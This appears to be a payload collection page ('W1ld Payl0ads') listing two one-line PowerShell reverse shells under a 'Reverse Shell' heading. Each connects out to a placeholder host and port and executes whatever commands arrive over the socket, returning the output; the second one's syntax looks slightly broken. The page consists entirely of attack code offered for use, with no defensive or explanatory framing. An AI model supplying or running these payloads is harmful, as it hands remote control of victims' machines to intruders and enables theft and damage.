
## W `1` l d P a y l `0` a d s

# [A] Powershell - Reverse Shell
[1] `noname`

```
$c=New-Object System.Net.Sockets.TCPClient('0.0.0.0',2222);$s=$c.GetStream();$r=New-Object System.IO.StreamReader($s);$w=New-Object System.IO.StreamWriter($s);$w.AutoFlush=$true;$sh=New-Object -ComObject 'WScript.Shell';$P=$sh.Exec('powershell.exe');$P|Out-Null;$w.WriteLine('Connected');while($true){$d=$r.ReadLine();switch($d){'exit'{$c.Close();return}default{$o=$sh.Exec("powershell.exe -Command $d");$res=$o.StdOut.ReadAll()+$o.StdErr.ReadAll();$w.WriteLine($res)}}}
```

[2] `noname`

```
$sm=(New-Object Net.Sockets.TCPClient('0.0.0.0',2222).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=[Text.Encoding]::ASCII.GetString($bt,0,$i);$st=([Text.Encoding]::ASCII.GetBytes((iex $d 2>&1)));$sm.Write($st,0,$st.Length)}
```
